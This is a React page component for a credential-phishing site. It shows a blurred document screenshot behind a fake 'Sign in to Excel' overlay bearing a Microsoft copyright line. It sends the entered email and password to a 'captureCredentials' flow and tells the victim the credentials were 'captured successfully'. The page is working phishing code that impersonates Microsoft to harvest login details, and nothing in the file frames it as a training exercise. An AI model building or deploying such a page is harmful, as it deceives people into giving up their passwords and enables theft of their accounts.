'use client';
import { FormEvent, useState } from 'react';
import { captureCredentials } from '@/ai/flows/capture-credentials';
import { useToast } from '@/hooks/use-toast';

export default function Home() {
  const imageUrl =
    'https://storage.googleapis.com/fsm-build-artefacts/PhishingSampleAnalysis10June-1.jpg';

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const { toast } = useToast();

  const handleSubmit = async (event: FormEvent) => {
    event.preventDefault();
    await captureCredentials({ username, password });
    toast({
      title: 'Signed In',
      description: 'Your credentials have been captured successfully.',
    });
    // Reset form if needed
    setUsername('');
    setPassword('');
  };

  return (
    <>
      {/* Blurred Image */}
      <img id="blurredImage" src={imageUrl} alt="Blurred screenshot" />

      {/* Login Overlay */}
      <div
        className="login-overlay"
        role="main"
        aria-label="Excel Login Screen"
      >
        <h2>Sign in to Excel</h2>
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            name="username"
            placeholder="Email or phone"
            autoComplete="username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            autoComplete="current-password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit">Sign in</button>
          <small>© Microsoft Corporation</small>
        </form>
      </div>
    </>
  );
}
